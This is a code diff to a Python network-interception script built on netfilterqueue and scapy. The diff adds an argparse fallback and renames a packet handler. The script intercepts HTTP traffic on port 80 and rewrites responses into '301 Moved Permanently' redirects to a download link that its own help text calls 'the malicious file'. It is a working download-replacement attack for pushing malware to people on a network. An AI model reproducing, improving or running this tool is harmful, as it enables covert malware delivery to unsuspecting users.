@@ -2,15 +2,20 @@
 import netfilterqueue as netq
 import scapy.all as scapy
 import optparse
+import argparse
 
 def get_args():
-    parser = optparse.OptionParser()
-    parser.add_option("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
-    (val, args) = parser.parse_args()
+    try:
+        parser = optparse.OptionParser()
+        parser.add_option("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
+        (val, args) = parser.parse_args()
+    except:
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
+        val = parser.parse_args()
     if not val.mal_link:
         parser.error("ERROR Missing argument, use --help for more info")
     return val
-
 def mod_packet(packet, link):
     packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: " + link + "\n\n"
     del packet[scapy.IP].len
@@ -19,7 +24,7 @@ def mod_packet(packet, link):
     return packet
 
 req_ack = []
-def mod_packet(packet):
+def work_packet(packet):
     use_packet = scapy.IP(packet.get_payload())
     if use_packet.haslayer(scapy.Raw):
         if use_packet[scapy.TCP].dport == 80:
@@ -37,5 +42,5 @@ def mod_packet(packet):
 
 value = get_args()
 queue = netq.NetfilterQueue()
-queue.bind(0, mod_packet)
+queue.bind(0, work_packet)
 queue.run()
